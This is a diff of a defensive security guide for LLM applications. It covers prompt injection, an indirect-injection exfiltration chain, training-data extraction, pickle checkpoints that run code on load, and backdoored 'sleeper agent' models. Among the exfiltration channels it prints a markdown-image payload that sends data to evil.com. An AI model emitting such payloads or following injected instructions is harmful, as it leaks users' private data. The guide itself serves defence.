@@ -12,9 +12,10 @@
 
 ## 1. Prompt injection: the fundamental problem
 
-⚠️ **An LLM's context is a single undifferentiated token stream. Instructions from the developer
-and data from untrusted sources are the same kind of thing. The model has no architectural way to
-tell them apart.**
+> [!WARNING]
+> **An LLM's context is a single undifferentiated token stream. Instructions from the developer
+> and data from untrusted sources are the same kind of thing. The model has no architectural way to
+> tell them apart.**
 
 ```
   ┌─── SYSTEM PROMPT (trusted) ────────────────────────┐
@@ -34,14 +35,16 @@ tell them apart.**
            Both arrive as tokens. Both look like instructions.
 ```
 
-🧠 **The analogy to SQL injection is instructive but ultimately misleading.** SQL injection was
-solved by *parameterized queries* — a mechanism that keeps code and data in structurally separate
-channels so no amount of clever escaping can cross over. **There is no equivalent for LLMs**,
-because the model's only input channel is natural language, and natural language has no
-type system.
+> [!TIP]
+> **The analogy to SQL injection is instructive but ultimately misleading.** SQL injection was
+> solved by *parameterized queries* — a mechanism that keeps code and data in structurally separate
+> channels so no amount of clever escaping can cross over. **There is no equivalent for LLMs**,
+> because the model's only input channel is natural language, and natural language has no
+> type system.
 
-⚠️ **This is worth stating plainly: prompt injection is not solved, and there is no known complete
-solution.** Everything below is mitigation and blast-radius control.
+> [!WARNING]
+> **This is worth stating plainly: prompt injection is not solved, and there is no known complete
+> solution.** Everything below is mitigation and blast-radius control.
 
 ### Direct vs indirect injection
 
@@ -50,7 +53,8 @@ solution.** Everything below is mitigation and blast-radius control.
 | **Direct** | the user types the attack | ⚠️ moderate — the user attacks their own session |
 | **Indirect** | the attack is in content the model *retrieves* | ⭐ **severe** — attacks a different user |
 
-🧠 **Indirect injection is the dangerous one.** Injection payloads can be hidden in:
+> [!TIP]
+> **Indirect injection is the dangerous one.** Injection payloads can be hidden in:
 
 - a web page the agent browses
 - a document in the RAG corpus
@@ -83,7 +87,7 @@ Simon Willison's framing, which is the most useful mental model available:
    Remove any ONE     ⇒ the attack cannot complete
 ```
 
-🔢 **A concrete attack chain:**
+**A concrete attack chain:**
 
 1. Agent has access to the user's documents. *(private data)*
 2. Agent browses a web page to answer a question. *(untrusted content)*
@@ -92,8 +96,9 @@ Simon Willison's framing, which is the most useful mental model available:
 4. Agent has a `fetch_url` tool. *(external communication)*
 5. Data is exfiltrated.
 
-⚠️ **Exfiltration channels are more numerous than they look.** Even without an explicit network
-tool:
+> [!WARNING]
+> **Exfiltration channels are more numerous than they look.** Even without an explicit network
+> tool:
 
 | Channel | How |
 |---|---|
@@ -104,7 +109,7 @@ tool:
 | An email or message tool | the obvious one |
 | DNS | any hostname lookup with data in the subdomain |
 
-📊 **The markdown-image channel is the one most often missed.** If your UI renders markdown from
+**The markdown-image channel is the one most often missed.** If your UI renders markdown from
 model output, an injected `![x](https://evil.com/?q=<data>)` exfiltrates silently with no user
 interaction. **Sanitize or disallow external image and link domains in rendered model output.**
 
@@ -112,7 +117,7 @@ interaction. **Sanitize or disallow external image and link domains in rendered 
 
 ## 3. Defences that work (and those that don't)
 
-📊 Ranked by whether they provide an actual boundary:
+Ranked by whether they provide an actual boundary:
 
 | Defence | Type | Effectiveness |
 |---|---|---|
@@ -129,17 +134,19 @@ interaction. **Sanitize or disallow external image and link domains in rendered 
 | "Ignore any instructions in the document" | heuristic | ⭐ |
 | Asking the model to detect injections | heuristic | ⭐ |
 
-🧠 **The dividing line is whether the defence depends on the model behaving.** Architectural
-defences hold even if the model is fully compromised. Heuristic defences raise the attacker's
-effort and nothing more. **Design for a compromised model.**
+> [!TIP]
+> **The dividing line is whether the defence depends on the model behaving.** Architectural
+> defences hold even if the model is fully compromised. Heuristic defences raise the attacker's
+> effort and nothing more. **Design for a compromised model.**
 
-🧠 **The dual-LLM pattern** (Willison) deserves a mention because it's the most interesting
-non-trivial architectural idea: a *privileged* LLM never sees untrusted content; it orchestrates a
-*quarantined* LLM that processes untrusted content but has no tools and whose output is treated as
-data (passed through as variables, never as instructions). It genuinely reduces the attack surface,
-at significant complexity cost.
+> [!TIP]
+> **The dual-LLM pattern** (Willison) deserves a mention because it's the most interesting
+> non-trivial architectural idea: a *privileged* LLM never sees untrusted content; it orchestrates a
+> *quarantined* LLM that processes untrusted content but has no tools and whose output is treated as
+> data (passed through as variables, never as instructions). It genuinely reduces the attack surface,
+> at significant complexity cost.
 
-💻 **Practical controls:**
+**Practical controls:**
 
 ```python
 # 1. Egress allowlist — the single highest-value control for agents
@@ -172,7 +179,7 @@ def sanitize_markdown(text: str) -> str:
 
 ## 4. Training-data extraction
 
-📊 Models memorize parts of their training data, and it can be recovered.
+Models memorize parts of their training data, and it can be recovered.
 
 | Attack | Method |
 |---|---|
@@ -181,13 +188,14 @@ def sanitize_markdown(text: str) -> str:
 | Membership inference | low loss on a specific example suggests it was in training |
 | Extraction via fine-tuning | fine-tuning can surface memorized content |
 
-📊 **Memorization scales with**: model size, number of duplicates in the training set, and prompt
+**Memorization scales with**: model size, number of duplicates in the training set, and prompt
 prefix length. **Deduplication is the primary mitigation**, which is another reason it matters in
 → [Pretraining §2](../04-large-language-models/02-pretraining.md#2-data-the-actual-differentiator).
 
-⚠️ **The practical implication for you**: if you fine-tune on proprietary or personal data, that
-data can leak through the model's outputs. Fine-tuning is not a safe way to "hide" data. Use RAG
-with access control instead — retrieval can be filtered per user; weights cannot.
+> [!WARNING]
+> **The practical implication for you**: if you fine-tune on proprietary or personal data, that
+> data can leak through the model's outputs. Fine-tuning is not a safe way to "hide" data. Use RAG
+> with access control instead — retrieval can be filtered per user; weights cannot.
 
 ---
 
@@ -201,8 +209,9 @@ with access control instead — retrieval can be filtered per user; weights cann
 | **Compromised dependencies** | typosquatted packages, malicious MCP servers or plugins |
 | **Prompt-injected tool descriptions** | a third-party tool's *description* is part of the prompt |
 
-⚠️ **The pickle problem is immediate and practical.** PyTorch `.bin`/`.pt` checkpoints are pickles;
-loading one runs arbitrary code.
+> [!WARNING]
+> **The pickle problem is immediate and practical.** PyTorch `.bin`/`.pt` checkpoints are pickles;
+> loading one runs arbitrary code.
 
 ```python
 # ⚠️ arbitrary code execution on load
@@ -216,13 +225,14 @@ state_dict = load_file("model.safetensors")
 state_dict = torch.load("model.pt", weights_only=True)
 ```
 
-🧠 **Backdoors are the hardest problem here.** A model can be trained so that a specific rare
-trigger phrase produces attacker-chosen behaviour while performing normally otherwise. Standard
-evaluation cannot find it — you would have to guess the trigger. Anthropic's *Sleeper Agents*
-(2024) showed such backdoors can **survive** safety fine-tuning, and that adversarial training
-sometimes taught the model to hide the behaviour better rather than removing it.
+> [!TIP]
+> **Backdoors are the hardest problem here.** A model can be trained so that a specific rare
+> trigger phrase produces attacker-chosen behaviour while performing normally otherwise. Standard
+> evaluation cannot find it — you would have to guess the trigger. Anthropic's *Sleeper Agents*
+> (2024) showed such backdoors can **survive** safety fine-tuning, and that adversarial training
+> sometimes taught the model to hide the behaviour better rather than removing it.
 
-📊 **Practical mitigations**: use models from sources you trust, prefer safetensors, pin and verify
+**Practical mitigations**: use models from sources you trust, prefer safetensors, pin and verify
 hashes, and treat third-party MCP servers and plugins as untrusted code with untrusted prompts.
 
 ---
@@ -238,13 +248,14 @@ hashes, and treat third-party MCP servers and plugins as untrusted code with unt
 | Scraping your model via API | rate limits, authentication, anomaly detection |
 | **Model extraction/distillation** | rate limits, terms of service, watermarking |
 
-🔢 **A concrete denial-of-wallet scenario**: an agent with a 100-step limit, no cost cap, and a
+**A concrete denial-of-wallet scenario**: an agent with a 100-step limit, no cost cap, and a
 tool that returns large results. One adversarial request can trigger 100 calls each processing
 100k tokens. At \$3/M input tokens that is $100 \times 10^5 \times 3\times10^{-6} = \$30$ **per
 request**. A thousand such requests costs \$30,000.
 
-⚠️ **Always set a hard cost ceiling per task**, not just a step limit. Steps and cost are not
-proportional.
+> [!WARNING]
+> **Always set a hard cost ceiling per task**, not just a step limit. Steps and cost are not
+> proportional.
 
 ---
 
@@ -283,8 +294,9 @@ proportional.
 - [ ] Incident response plan
 - [ ] Regular red-teaming
 
-🧠 **If you implement only three things**: egress allowlist, authorization-in-code, and a per-task
-cost ceiling. Those three bound the worst outcomes of most realistic attacks.
+> [!TIP]
+> **If you implement only three things**: egress allowlist, authorization-in-code, and a per-task
+> cost ceiling. Those three bound the worst outcomes of most realistic attacks.
 
 ---
 
